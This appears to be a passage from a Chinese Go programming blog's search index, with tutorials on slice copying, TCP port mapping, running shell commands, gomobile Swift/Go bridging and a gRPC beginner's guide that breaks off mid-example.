(johng.cn)\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E6%9C%BA%E5%88%B6/","title":"Go 静态编译机制"},{"content":"Go 切片的深拷贝和浅拷贝 切片(Slice)的底层数据结构如下所示：\n1 2 3 4 5 6 // src/runtime/slice.go type slice struct { array unsafe.Pointer\t// 数组指针 len int\t// 切片长度 cap int\t// 切片容量 } 浅拷贝 切片进行浅拷贝时，会 new 一个新的切片结构体，重设切片容量和长度，但是新切片和老切片指向的底层数组指针为同一个数组指针。\n浅拷贝过程如图所示：\n因此，当新切片中对应位置的数据发生改变时，老切片的数据也会发生改变。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; \u0026#34;unsafe\u0026#34; ) func main() { a1 := []int{1, 2, 3, 4, 5, 6} fmt.Println(a1, len(a1), cap(a1))\t// [1 2 3 4 5 6] 6 6 a2 := a1[2:4] fmt.Println(a2, len(a2), cap(a2))\t// [3 4] 2 4 a2[1] = 888 fmt.Println(a1, a2)\t// [1 2 3 888 5 6] [3 888] a1Addr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;a1)).Data a2Addr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;a2)).Data fmt.Println(\u0026#34;切片a1指向的底层数组地址:\u0026#34;, a1Addr)\t// 切片a1指向的底层数组地址: 824633770848 fmt.Println(\u0026#34;切片a2指向的底层数组地址:\u0026#34;, a2Addr)\t// 切片a2指向的底层数组地址: 824633770864 fmt.Println(\u0026#34;偏移量:\u0026#34;, (a2Addr-a1Addr)/unsafe.Sizeof(int(1)))\t// 偏移量: 2 } 深拷贝 浅拷贝时，切片指向的底层数组指针是相同的，可能会出现新老切片相互影响的问题。当需要两个指向底层数组不同的切片时，就需要深拷贝。\n深拷贝时，老切片指向的底层数组也会进行拷贝，因此新老切片的数据是完全隔离的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; \u0026#34;unsafe\u0026#34; ) func main() { a1 := []int{1, 2, 3, 4, 5, 6} fmt.Println(a1, len(a1), cap(a1))\t// [1 2 3 4 5 6] 6 6 a2 := make([]int, len(a1)) copy(a2, a1) fmt.Println(a2, len(a2), cap(a2))\t// [1 2 3 4 5 6] 6 6 a2[1] = 888 fmt.Println(a1, a2)\t// [1 2 3 4 5 6] [1 888 3 4 5 6] a1Addr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;a1)).Data a2Addr := (*reflect.SliceHeader)(unsafe.Pointer(\u0026amp;a2)).Data fmt.Println(\u0026#34;切片a1指向的底层数组地址:\u0026#34;, a1Addr)\t// 切片a1指向的底层数组地址: 824633770848 fmt.Println(\u0026#34;切片a2指向的底层数组地址:\u0026#34;, a2Addr)\t// 切片a2指向的底层数组地址: 824633770944 } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E5%88%87%E7%89%87%E7%9A%84%E6%B7%B1%E6%8B%B7%E8%B4%9D%E5%92%8C%E6%B5%85%E6%8B%B7%E8%B4%9D/","title":"Go 切片的深拷贝和浅拷贝"},{"content":"Go 实现端口映射 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package main import ( \u0026#34;io\u0026#34; \u0026#34;net\u0026#34; ) func main() { localIP, localPort := net.ParseIP(\u0026#34;0.0.0.0\u0026#34;), 80 remoteIP, remotePort := net.ParseIP(\u0026#34;10.0.2.2\u0026#34;), 8080 localTCP, err := net.ListenTCP(\u0026#34;tcp\u0026#34;, \u0026amp;net.TCPAddr{IP: localIP, Port: localPort}) if err != nil { return } for { conn, err := localTCP.Accept() if err != nil { return } NewPortMap(remoteIP, remotePort, conn) } } func NewPortMap(remoteIP net.IP, remotePort int, conn net.Conn) { remoteTCP, err := net.DialTCP(\u0026#34;tcp\u0026#34;, nil, \u0026amp;net.TCPAddr{IP: remoteIP, Port: remotePort}) if err != nil { panic(err) return } go func() { io.Copy(remoteTCP, conn) }() go func() { io.Copy(conn, remoteTCP) }() } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/","title":"Go 实现端口映射"},{"content":"Go 数组初始化详解 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; ) func main() { var a []int b := []int{} fmt.Printf(\u0026#34;%p \\n\u0026#34;, a) fmt.Printf(\u0026#34;%p \\n\u0026#34;, b) dataA, _ := json.Marshal(a) fmt.Println(string(dataA)) dataB, _ := json.Marshal(b) fmt.Println(string(dataB)) fmt.Println(reflect.ValueOf(a).IsNil()) // true fmt.Println(reflect.ValueOf(b).IsNil()) // false } a 和 b 变量的两种声明方式不同，a 变量声明了一个 []int 类型的空指针，而 b 是声明了一个实际变量。\n在 JSON 反序列化的过程中，由于 a 是空指针，会被序列化为 null，而 b 会被序列化为 [] 。\n在实际生产环境中更推介 a 变量的声明方式，因为 a 变量在使用时才会初始化分配内存，而 b 变量在声明时就会分配内存。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E6%95%B0%E7%BB%84%E5%88%9D%E5%A7%8B%E5%8C%96%E8%AF%A6%E8%A7%A3/","title":"Go 数组初始化详解"},{"content":"Go 执行 shell 命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func SystemCall(ctx context.Context, cmd string) error { var ( command *exec.Cmd out bytes.Buffer stderr bytes.Buffer ) log.Printf(\u0026#34;exec command: %s \\n\u0026#34;, cmd) // 执行连续的shell命令时, 需要注意指定执行路径和参数, 否则运行出错 // os.ExpandEnv 可以解析命令中的环境变量 command = exec.CommandContext(ctx, \u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, os.ExpandEnv(cmd)) command.Stdout = \u0026amp;out\t// 获取系统命令执行输出 command.Stderr = \u0026amp;stderr // 获取系统命令执行错误时的输出 if err := command.Run(); err != nil { err1 := errors.New(fmt.Sprintf(\u0026#34;%s -\u0026gt; %s\u0026#34;, err.Error(), stderr.String())) // 拼接错误 return err1 } return nil } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/go-%E6%89%A7%E8%A1%8C-shell-%E5%91%BD%E4%BB%A4/","title":"Go 执行 shell 命令"},{"content":"iOS bind Swift/ObjC和go的交互是通过cgo。\n系统线程 Swift/ObjC有线程概念。从c调用go时，线程阻塞等待go返回；go执行完成后，线程继续执行c代码。\ngo没有线程概念。go调用c时，goroutine阻塞；如果c不能及时返回，即处理此Goroutine的系统线程被阻塞，go运行时将启动额外线程，维持GOMAXPROCS数量的可用系统线程处理其他goroutines。\n在线程数量可控的情况下，使用同步方式阻塞线程并无大碍。但在阻塞线程不可控的情况下，会引发效率问题。\n异步编程 各语言都提供了各自的异步编程方案，Swift的async/await，GCD，goroutines。关键之处在于：函数不能阻塞线程。\ngomobile没有提供通用模版，生成的ObjC代码也无法被Swift自动转为async函数。所以只能使用callback方式，自行封装。\nSwift 调用 Go 主功能LongAddCore由go实现，swift里通过task并发调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package mygo func LongAddCore(a int, b int) int { time.Sleep(2 * time.Second) return a + b } type LongAddCallback interface { Done(int) } type LongAdd interface { Run(a int, b int, cb LongAddCallback) } type longAdd struct { } func (l *longAdd) Run(a int, b int, cb LongAddCallback) { go func() { cb.Done(LongAddCore(a, b)) }() } var LongAddInst LongAdd = \u0026amp;longAdd{} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class LongAddCallbackImpl: NSObject, MygoLongAddCallbackProtocol { let continuation: CheckedContinuation\u0026lt;Int, Never\u0026gt; init(continuation: CheckedContinuation\u0026lt;Int, Never\u0026gt;) { self.continuation = continuation } func done(_ result: Int) { continuation.resume(returning: result) } static func doLongAdd(a:Int, b:Int) async -\u0026gt; Int { await withCheckedContinuation { continuation in Mygo.longAddInst()?.run(a, b: b, cb: LongAddCallbackImpl(continuation: continuation)) } } } // 以下是演示代码 // .task { await withTaskGroup(of: Void.self) { group in for i in 1...1000 { group.addTask { let r = await LongAddCallbackImpl.doLongAdd(a: i, b: i) assert(r == i + i, \u0026#34;Incorrect result\u0026#34;) } } await group.waitForAll() print(\u0026#34;LongAdd - Done\u0026#34;) } 忽略掉中间的桥接代码，最终的结果是：\ngo定义了func LongAddCore(a int, b int) int 通过一大堆桥接代码 在swift里使用func doLongAdd(a:Int, b:Int) async -\u0026gt; Int Go 调用 Swift 主功能LongSubCore由Swift实现，go里通过goroutines并发调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package mygo type LongSubCallback interface { Done(int) } type LongSub interface { Run(a int, b int, cb LongSubCallback) } type longSubCallbackImpl struct { c chan int } func (l *longSubCallbackImpl) Done(i int) { l.c \u0026lt;- i } var LongSubInst LongSub func doLongSub(a int, b int) int { c := make(chan int) go LongSubInst.Run(a, b, \u0026amp;longSubCallbackImpl{c}) return \u0026lt;-c } // 以下是演示代码，由Swift调用 func StartLongSub() { go func() { var wg sync.WaitGroup for i := 0; i \u0026lt; 1000; i++ { wg.Add(1) go func() { defer wg.Done() r := doLongSub(i, -i) if r != i+i { log.Println(\u0026#34;Incorrect result\u0026#34;) } }() } wg.Wait() log.Println(\u0026#34;LongSub - Done\u0026#34;) }() } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func LongSubCore(a: Int, b: Int) async -\u0026gt; Int { try? await Task.sleep(nanoseconds: 2_000_000_000) return a-b } class LongSubInst: NSObject, MygoLongSubProtocol { func run(_ a: Int, b: Int, cb: (any MygoLongSubCallbackProtocol)?) { Task { let r = await LongSubCore(a: a, b: b) cb?.done(r) } } } // 设置LongSub的实现后，调用演示代码 // .task { Mygo.setLongSubInst(LongSubInst()) MygoStartLongSub() 忽略掉中间的桥接代码，最终的结果是：\nswift定义了func LongSubCore(a: Int, b: Int) async -\u0026gt; Int 通过一大堆桥接代码 go里使用func doLongSub(a int, b int) int 总结 封装成签名几乎一致的异步接口，桥接层代码繁多，不适合手写。 直接使用callback也可以完成，但在调用方无法使用自己语言特有的同步写法。 也可以把go封装成ObjC的Delegate模式，由go触发事件回调。 使用阻塞线程的方式，代码简单。 从Swift调用Go，有线程概念，线程数量固定。 从Go调用Swift，Swift一旦卡住Go会新启线程，导致线程数量不可控。 因此，需要按实际的用法来决定如何封装和桥接。推荐把Go封装成ObjC接口给Swift用，设计模式可照ObjC来做。\n避免内存复制 由于跨语言，不复制内存的方式传递数据，只能用传统的方式传递内存地址。使用时一定注意内存地址的有效性，建议仅在同步调用时使用。\nSwift提供内存空间，Go使用 1 2 3 4 5 var d = Data(count: 128) d.withUnsafeMutableBytes { p in while true { let n = l2conn!.read(Int64(UInt(bitPattern:p.baseAddress)), n: p.count) //... 1 2 3 4 5 func (c *l2conn) Read(p int64, n int) int { ptr := unsafe.Pointer(uintptr(p)) bytes := (*[1 \u0026lt;\u0026lt; 30]byte)(ptr)[:n:n] n, e := c.netConn.Read(bytes) // ... 大写开头的变量名 gomobile生成Obj-C代码时，对于大写字母开头的字段，产生的Obj-C属性名称与其Setter名称不一致。\n比如原始字段：IPAddr 生成的Obj-C属性：ipAddr Obj-C预期的Setter：setIpAddr gomobile生成的Setter：setIPAddr\n此问题于2020年已有Patch https://github.com/golang/mobile/pull/50，但gomobile社区非常不活跃，没有合并此Patch。\n应对方案 如果修改并自行维护gomobile，一但开发人员误用原版gomobile，将会引发难以发现的问题。为了避免潜在的风险，我们迁就gomobile，字段定义时不使用连续的大写字母开头。\n如果误用了连续大写字母开头，相应功能失效，一般在开发时就能发现。 基本不破坏可读性。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/gomobile-%E5%8E%9F%E7%90%86/","title":"gomobile 原理"},{"content":"gRPC 入门使用教程 一、gRPC 介绍 在 gRPC 里客户端应用可以像调用本地对象一样直接调用另一台不同的机器上服务端应用的方法，使得您能够更容易地创建分布式应用和服务。与许多 RPC 系统类似，gRPC 也是基于以下理念：定义一个服务，指定其能够被远程调用的方法（包含参数和返回类型）。在服务端实现这个接口，并运行一个 gRPC 服务器来处理客户端调用。在客户端拥有一个存根能够像服务端一样的方法。\n二、安装与使用 安装 protoc 程序：\n从 https://github.com/google/protobuf/releases下载适合你平台的预编译好的二进制文件（protoc-\u0026lt;version\u0026gt;-\u0026lt;platform\u0026gt;.zip），然后将压缩包内的 /bin/protoc 文件添加到环境变量即可：\n1 2 3 4 5 6 7 8 # 下载压缩包 wget https://github.com/protocolbuffers/protobuf/releases/download/v21.9/protoc-21.9-linux-x86_64.zip # 解压 unzip -d ./protoc protoc-21.9-linux-x86_64.zip # 移动到 /usr/local/bin 下面 mv ./protoc/bin/protoc /usr/local/bin 首先需要确保将 GOBIN 添加进了环境变量，如果没有添加使用的时候会无法找到路径。Linux 环境下可通过以下指令添加：\n1 2 3 export GOPATH=$HOME/go export GOBIN=$GOPATH/bin export PATH=$PATH:$GOPATH/bin 安装 protoc-gen-go 和 protoc-gen-go-grpc 插件：\n1 2 3 4 5 # protoc-gen-go 插件主要用于将 *.proto 文件生成一个后缀为 *.pb.go 的文件。生成文件中包含所有 .proto 文件中定义的类型及其序列化方法 go install google.golang.org/protobuf/cmd/protoc-gen-go@latest # protoc-gen-go-grpc 插件主要用于生成 gRPC 服务端需要实现的接口和客户端调用的接口 go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@latest 测试环境安装是否成功：\n1 2 3 4 5 6 7 8 \u0026gt; protoc --version libprotoc 3.21.9 \u0026gt; protoc-gen-go --version protoc-gen-go v1.28.1 \u0026gt; protoc-gen-go-grpc --version protoc-gen-go-grpc 1.2.0 三、protobuff 语法 proto 文件主要包含 proto 基本信息以及 RPC 服务定义。\n进行一次 RPC 调用需要注意两个点：方法和参数。在 porro 文件中，方法用 Service 定义，参数用 Message 定义。\n1. 基本信息 1 2 3 4 5 6 7 8 9 10 // 版本声明，使用Protocol Buffers v3版本 syntax = \u0026#34;proto3\u0026#34;; // package 是 proto 的包名,一个文件就是一个 package,用于 import 时解析(与 go 的包管理类似) package pb; // option go_package = \u0026#34;path;name\u0026#34;; // path 表示生成的go文件的存放地址，会自动生成目录的。 // name 表示生成的go文件所属的包名 option go_package = \u0026#34;./;pb\u0026#34;; 2. message 一个 Message 中主要包含：字段编号和字段类型；\n字段编号\n消息定义中的每个字段都有一个唯一的编号。这些字段编号用来在消息二进制格式中标识字段，在消息类型使用后就不能再更改。\n注意，范围1到15中的字段编号需要一个字节进行编码，包括字段编号和字段类型。范围16到2047的字段编号采用两个字节。因此，应该为经常使用的消息元素保留数字1到15的编号。切记为将来可能添加的经常使用的元素留出一些编号。\n字段类型\n字段类型包含标量类型、组合类型、枚举类型、数组类型、map 类型和嵌套消息；\n2.1 标量类型 下表中列举了 protobuff 中的类型与常见编程语言中类型的对应关系：\nNotes C++ Java/Kotlin Python Go double double double float float64 float float float float float32 int32 使用可变长度编码。编码负数效率低下——如果你的字段可能有负值，则使用 sint32代替。 int32 int int int32 int64 使用可变长度编码。编码负数效率低下——如果你的字段可能有负值，则使用 sint64代替。 int64 long int/long[4] int64 uint32 使用变长编码。 uint32 int[2] int/long[4] uint32 uint64 使用变长编码。 uint64 long[2] int/long[4] uint64 sint32 使用可变长度编码。带符号的 int 值。这些编码比普通的 int32更有效地编码负数。 int32 int int int32 sint64 使用可变长度编码。带符号的 int 值。这些编码比普通的 int64更有效地编码负数。 int64 long int/long[4] int64 fixed32 总是四个字节。如果值经常大于228，则比 uint32更有效率。 uint32 int[2] int/long[4] uint32 fixed64 总是8字节。如果值经常大于256，则比 uint64更有效率。 uint64 integer/string[6] sfixed32 总是四个字节。 int32 int int int32 sfixed64 总是八个字节。 int64 integer/string[6] bool bool boolean bool bool string 字符串必须始终包含 UTF-8编码的或7位 ASCII 文本，且不能长于232。 string String str/unicode[5] string bytes 可以包含任何不超过232字节的任意字节序列。 string ByteString str (Python 2) bytes (Python 3) []byte examples：\n1 2 3 4 5 message HelloRequest { string name = 1; int64 age = 2; bool man = 3; } 2.2 枚举类型 当需要定义一个消息类型的时候，可能想为一个字段指定 “预定义值序列” 中的一个值，这时候可以通过枚举实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 enum PhoneType // 枚举消息类型，使用 enum 关键词定义 { MOBILE = 0; // proto3 版本中，枚举类型首成员必须为0，成员不应有相同的值 HOME = 1; WORK = 2; } // 定义一个电话消息 message PhoneNumber { string number = 1; PhoneType type = 2; } 2.3 数组类型 在 protobuf 消息中定义数组类型，是通过在字段前面增加 repeated 关键词实现，标记当前字段是一个数组。\n1 2 3 4 message Msg { repeated int32 arrays = 1; repeated string strings = 2; } 2.4 map 类型 map 类型的定于语法为：\n1 map\u0026lt;key_type, value_type\u0026gt; map_field = N; key_type可以是任何整数或字符串类型（除浮点类型和字节之外的任何标量类型）。请注意，枚举不是有效的key_type。\n示例：\n1 2 3 4 message Msg { map\u0026lt;string, int\u0026gt; dictA = 1; map\u0026lt;string, string\u0026gt; dictB = 2; } 2.5 嵌套类型 我们在各种语言开发中类的定义是可以互相嵌套的，也可以使用其他类作为自己的成员属性类型。\n在 protobuf 中同样支持消息嵌套，可以在一个消息中嵌套另外一个消息，字段类型可以是另外一个消息类型。\n引用其他消息类型\n1 2 3 4 5 6 7 8 9 message Msg1 { string name = 1; int32 age = 2; } message Msg2 { string describe = 1; Msg1 msg = 2; } 消息嵌套\n1 2 3 4 5 6 7 message Msg1 { message Msg2 { string name = 1; string age = 2; } Msg2 msg = 1; } import 导入其他 proto 文件定义的消息\nmsg1.proto:\n1 2 3 4 5 6 7 8 syntax = \u0026#34;proto3\u0026#34;; package msg1; message Msg1 { string name = 1; string age = 2; } msg2.proto:\n1 2 3 4 5 6 7 8 9 syntax = \u0026#34;proto3\u0026#34;; import \u0026#34;msg1.proto\u0026#34;; package msg2; message Msg2 { msg1.Msg1 msg = 1; } 3. Service 在 gRPC 中，可以定义四种类型的服务方法：\n简单RPC (simple RPC)：客户端向服务器发送一个请求，然后得到一个响应，就像普通的函数调用一样：\n1 rpc SimpleRPC(HelloRequest) returns (HelloResponse); 服务端流式RPC (server-side streaming RPC)：客户端向服务端发送一个请求，服务端返回客户端一个流。客户端可以从这个流中读取，直到服务端关闭这个流：\n1 rpc ServerSideStreamingRPC(HelloRequest) returns (stream HelloResponse); 客户端流式RPC (client-side streaming RPC)：客户端向服务端发起一个流式请求。客户端可以向流中多次写入数据，服务端从流中多次取出数据，直到客户端关闭流。服务端接收完所有数据后，向客户端返回一个普通响应：\n1 rpc ClientSideStreamingRPC(stream HelloRequest) returns (HelloResponse); 双向流式RPC (bidirectional streaming RPC)：客户端向服务端发起一个流式请求，服务端向客户端返回一个流式响应。两个流之间相互独立，互不影响：\n1 rpc BidrectionalStreamingRPC(stream HelloRequest) returns (stream HelloResponse); 将需要定义的 RPC 调用写入 Service 字段：\n1 2 3 4 5 6 7 8 9 service Greeter { rpc SimpleRPC(HelloRequest) returns (HelloResponse); rpc ServerSideStreamingRPC(HelloRequest) returns (stream HelloResponse); rpc ClientSideStreamingRPC(stream HelloRequest) returns (HelloResponse); rpc BidrectionalStreamingRPC(stream HelloRequest) returns (stream HelloResponse); } 四、gRPC 示例 首先建一个 Go 的工程：\n1 go mod init grpcDemo 然后导入 gRPC 包：\n1 go get google.golang.org/grpc@latest 当前目录结构为：\n1 2 3 . ├── go.mod └── go.sum 1. 编写 protobuff 代码 新建一个 pb 目录，编写 demo.proto 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 syntax = \u0026#34;proto3\u0026#34;; option go_package = \u0026#34;./;pb\u0026#34;; package pb; service Greeter { // 简单 RPC rpc SimpleRPC(HelloRequest) returns (HelloResponse); // 服务端流式 RPC rpc ServerSideStreamingRPC(HelloRequest) returns (stream HelloResponse); // 客户端流式 RPC rpc ClientSideStreamingRPC(stream HelloRequest) returns (HelloResponse); // 双端流式 RPC rpc BidrectionalStreamingRPC(stream HelloRequest) returns (stream HelloResponse); } message HelloRequest {string name = 1;} message HelloResponse {string reply = 1;} 当前目录结构为：\n1 2 3 4 5 . ├── go.mod ├── go.sum └── pb └── demo.proto 通过以下命令将 .proto 文件生成 .go 文件：\n1 protoc --go_out=. --go_opt=paths=source_relative --go-grpc_out=. --go-grpc_opt=paths=source_relative pb/demo.proto 执行命令后会在当前文件夹下生成两个 .go 文件：\n1 2 3 4 5 6 7 . ├── go.mod ├── go.sum └── pb ├── demo.pb.go ├── demo.proto └── demo_grpc.pb.go 2. 编写 Go 代码 新建一个 server和client 目录，创建 server.go和client.go 文件进行服务端和客户端代码编写。\n2.1 Simple RPC 服务端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package main import ( \u0026#34;context\u0026#34; \u0026#34;grpcDemo/pb\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;google.golang.org/grpc\u0026#34; ) type server struct { // 继承 protoc-gen-go-grpc 生成的服务端代码 pb.UnimplementedGreeterServer } // SimplePRC 服务端代码 func (s *server) SimpleRPC(ctx context.Context, in *pb.HelloRequest) (*pb.HelloResponse, error) { log.Println(\u0026#34;client call simpleRPC...\u0026#34;) log.Println(in) return \u0026amp;pb.HelloResponse{Reply: \u0026#34;Hello \u0026#34; + in.Name}, nil } func main() { // 监听本地 5678 端口 listen, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:5678\u0026#34;) if err != nil { log.Fatal(err) return } // 创建 gRPC 服务器 s := grpc.NewServer() // 将实现的接口注册进 gRPC 服务器 pb.RegisterGreeterServer(s, \u0026amp;server{}) log.Println(\u0026#34;gRPC server starts running...\u0026#34;) // 启动 gRPC 服务器 err = s.Serve(listen) if err != nil { log.Fatal(err) return } } 客户端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package main import ( \u0026#34;context\u0026#34; \u0026#34;grpcDemo/pb\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;google.golang.org/grpc\u0026#34; \u0026#34;google.golang.org/grpc/credentials/insecure\u0026#34; ) func simpleRPC(c pb.GreeterClient) { ctx := context.Background() // 调用服务端 SimpleRPC 并获取响应 reply, err := c.SimpleRPC(ctx, \u0026amp;pb.HelloRequest{Name: \u0026#34;simpleRPC\u0026#34;}) if err != nil { log.Fatal(err) } log.Println(reply.GetReply()) } func main() { // 连接服务端，因为我们没有SSL证书，因此这里需要禁用安全传输 dial, err := grpc.Dial(\u0026#34;127.0.0.1:5678\u0026#34;, grpc.WithTransportCredentials(insecure.NewCredentials())) if err != nil { log.Fatal(err) return } defer dial.Close() conn := pb.NewGreeterClient(dial) simpleRPC(conn) } 当前目录结构：\n. ├── client │ └── client.go ├── go.mod ├── go.sum ├── pb │ ├── demo.pb.go │ ├── demo.proto │ └── demo_grpc.pb.go └── server └── server.go 分别使用两个终端运行服务端和客户端的代码:\n1 2 3 4 5 6 7 \u0026gt; go run server/server.go 2022/10/27 08:55:59 gRPC server starts running... 2022/10/27 08:56:41 client call simpleRPC... 2022/10/27 08:56:41 name:\u0026#34;simpleRPC\u0026#34; \u0026gt; go run client/client.go 2022/10/27 08:56:41 Hello simpleRPC 2.2 服务端流式 RPC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // server.go func (s *server) ServerSideStreamingRPC(in *pb.HelloRequest, stream pb.Greeter_ServerSideStreamingRPCServer) error { log.Println(\u0026#34;client call ServerSideStreamingRPC...\u0026#34;) words := []string{ \u0026#34;你好\u0026#34;, \u0026#34;hello\u0026#34;, \u0026#34;こんにちは\u0026#34;, \u0026#34;안녕하세요\u0026#34;, } for _, word := range words { data := \u0026amp;pb.HelloResponse{ Reply: word + \u0026#34; \u0026#34; + in.Name, } // 向流中不断写入数据 if err := stream.SendMsg(data); err != nil { return err } } return nil } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // client.go func serverSideStreamRPC(c pb.GreeterClient) { ctx := context.Background() // 调用服务端方法 stream, err := c.ServerSideStreamingRPC(ctx, \u0026amp;pb.HelloRequest{Name: \u0026#34;gRPC!\u0026#34;}) if err != nil { log.Fatal(err) } for { // 接收服务端返回的流式数据，当收到io.EOF或错误时退出 res, err := stream.Recv() // 判断流是否关闭 if err == io.EOF { break } if err != nil { log.Fatal(err) } log.Printf(\u0026#34;got reply: %q\\n\u0026#34;, res.GetReply()) } } 分别使用两个终端运行服务端和客户端的代码:\n1 2 3 4 5 6 7 8 9 \u0026gt; go run server/server.go 2022/10/27 09:02:59 gRPC server starts running... 2022/10/27 09:03:23 client call ServerSideStreamingRPC... \u0026gt; go run client/client.go 2022/10/27 09:03:23 got reply: \u0026#34;你好 gRPC!\u0026#34; 2022/10/27 09:03:23 got reply: \u0026#34;hello gRPC!\u0026#34; 2022/10/27 09:03:23 got reply: \u0026#34;こんにちは gRPC!\u0026#34; 2022/10/27 09:03:23 got reply: \u0026#34;안녕하세요 gRPC!\u0026#34; 2.3 客户端流式 RPC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // server.go func (s *server) ClientSideStreamingRPC(stream pb.Greeter_ClientSideStreamingRPCServer) error { log.Println(\u0026#34;client call ClientSideStreamingRPC...\u0026#34;) reply := \u0026#34;Hello: \u0026#34; for { // 从流中接收客户端发送的数据 res, err := stream.Recv() // 判断流是否关闭 if err == io.EOF { return stream.SendAndClose(\u0026amp;pb.HelloResponse{Reply: reply}) } if err != nil { return err } reply += \u0026#34;, \u0026#34; + res.GetName() } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // client.go func clientSideStreamRPC(c pb.GreeterClient) { ctx := context.Background() // 调用服务端方法 stream, err := c.ClientSideStreamingRPC(ctx) if err != nil { log.Fatal(err) } names := []string{\u0026#34;a1\u0026#34;, \u0026#34;a2\u0026#34;, \u0026#34;a3\u0026#34;, \u0026#34;a4\u0026#34;} for _, name := range names { // 向流中不断写入数据 err := stream.Send(\u0026amp;pb.HelloRequest{Name: name}) if err != nil { log.Fatal(err) } } // 向服务端发送关闭流的信号，并接收数据 res, err := stream.CloseAndRecv() if err != nil { log.Fatal(err) } log.Println(res.Reply) } 分别使用两个终端运行服务端和客户端的代码:\n1 2 3 4 5 6 \u0026gt; go run server/server.go 2022/10/27 09:17:04 gRPC server starts running... 2022/10/27 09:17:11 client call ClientSideStreamingRPC... \u0026gt; go run client/client.go 2022/10/27 09:17:11 Hello: , a1, a2, a3, a4 2.4 双端流式 RPC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // server.go func (s *server) BidrectionalStreamingRPC(stream pb.Greeter_BidrectionalStreamingRPCServer) error { log.Println(\u0026#34;client call BidrectionalStreamingRPC...\u0026#34;) for { // 接收来自客户端的数据 res, err := stream.Recv() if err == io.EOF { return nil } if err != nil { return err } reply := \u0026#34;Hello \u0026#34; + res.GetName() // 向客户端发送数据 if err := stream.Send(\u0026amp;pb.HelloResponse{Reply: reply}); err != nil { return err } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // client.go func bidStreamRPC(c pb.GreeterClient) { // 调用服务端方法 stream, err := c.BidrectionalStreamingRPC(context.Background()) if err != nil { log.Fatal(err) } names := []string{\u0026#34;a1\u0026#34;, \u0026#34;a2\u0026#34;, \u0026#34;a3\u0026#34;, \u0026#34;a4\u0026#34;} for _, name := range names { // 向服务端发送数据 err := stream.Send(\u0026amp;pb.HelloRequest{Name: name}) if err != nil { log.Fatal(err) } // 从客户端接收数据 reply, err := stream.Recv() if err != nil { log.Fatal(err) } log.Println(reply.GetReply()) } // 关闭流 err = stream.CloseSend() if err != nil { log.Fatal(err) } } 分别使用两个终端运行服务端和客户端的代码:\n1 2 3 4 5 6 7 8 9 \u0026gt; go run server/server.go 2022/10/27 09:20:51 gRPC server starts running... 2022/10/27 09:26:26 client call BidrectionalStreamingRPC... \u0026gt; go run client/client.go 2022/10/27 09:26:26 Hello a1 2022/10/27 09:26:26 Hello a2 2022/10/27 09:26:26 Hello a3 2022/10/27 09:26:26 Hello a4 3. gRPC 使用 Unix Socket 通信 gRPC 默认使用的是 TCP 通信。但是如果想仅仅在本机进行进程间通信，就没必要过一层网络接口了，直接使用 unix socket 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 // server.go package main import ( \u0026#34;context\u0026#34; \u0026#34;grpcDemo/pb\u0026#34; \u0026#34;log\u0026#34; 